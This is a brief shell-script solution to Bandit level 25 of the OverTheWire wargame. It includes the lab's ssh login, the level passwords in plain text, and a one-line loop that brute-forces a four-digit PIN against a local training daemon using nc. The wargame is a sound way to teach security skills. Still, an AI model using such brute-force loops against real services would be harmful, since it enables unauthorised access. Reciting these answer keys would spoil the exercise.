# Solution to Bandit level 25 on OverTheWire.org.

# Connect as bandit 24.
# ssh bandit24@bandit.labs.overthewire.org -p 2220
# The password is: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
                  
# Goals:
# A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

# Loop through 0000 to 9999, echo password + number, use grep to exclude failed attempts.
for i in {0000..9999}; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"; done | nc localhost 30002 | grep -v "Wrong"

# The password for bandit25 is: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
